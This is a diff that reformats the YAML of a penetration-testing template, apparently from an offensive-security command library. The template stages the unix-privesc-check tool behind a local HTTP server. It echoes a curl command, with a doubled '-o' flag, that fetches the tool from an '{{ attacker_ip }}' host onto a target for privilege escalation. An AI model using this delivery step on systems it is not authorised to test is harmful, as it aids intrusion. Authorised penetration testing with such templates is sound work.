@@ -1,14 +1,14 @@
+---
 metadata:
-  filename: deliver-linux-unix-privesc-check.yaml
-  tags:
-  - linux
-  - privesc
-  created: '2025-03-29'
-  author: Unknown
-content: "mkdir -p packstation/outbound; cp -n /usr/bin/unix-privesc-check packstation/outbound;\
-  \ \\\necho '================================================================'; \\\
-  \necho '                       -----Linux------                         '; \\\n\
-  echo 'Deliver only: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/unix-privesc-check\
-  \ -o -o {{ delivery_path_linux }}/unix-privesc-check'; \\\necho '================================================================';\
-  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
-  \ delivery_outbound_port }} -d packstation/outbound\n"
+  filename: "deliver-linux-unix-privesc-check.yaml"
+  tags: ["linux", "privesc"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  mkdir -p packstation/outbound; cp -n /usr/bin/unix-privesc-check packstation/outbound; \
+  echo '================================================================'; \
+  echo '                       -----Linux------                         '; \
+  echo 'Deliver only: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/unix-privesc-check -o -o {{ delivery_path_linux }}/unix-privesc-check'; \
+  echo '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
